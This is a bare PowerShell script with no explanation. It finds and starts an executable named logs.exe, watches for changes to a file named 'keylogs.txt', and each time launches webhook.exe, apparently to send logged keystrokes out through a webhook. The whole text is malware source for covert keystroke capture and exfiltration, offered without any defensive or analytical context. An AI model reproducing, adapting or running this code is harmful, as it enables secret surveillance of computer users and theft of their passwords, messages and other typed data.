$logsExe = (Get-ChildItem -Path "C:\" -Filter "logs.exe" -Recurse | Select-Object -First 1).FullName
$webhookExe = (Get-ChildItem -Path "C:\" -Filter "webhook.exe" -Recurse | Select-Object -First 1).FullName

Start-Process $logsExe

$fsw = New-Object System.IO.FileSystemWatcher
$fsw.Path = "C:\"
$fsw.Filter = "keylogs.txt"
$fsw.NotifyFilter = [System.IO.NotifyFilters]'FileName, LastWrite'
$fsw.IncludeSubdirectories = $true
$fsw.EnableRaisingEvents = $true

$action = {
    Start-Process $webhookExe
}

Register-ObjectEvent $fsw Changed -Action $action

while ($true) {
}
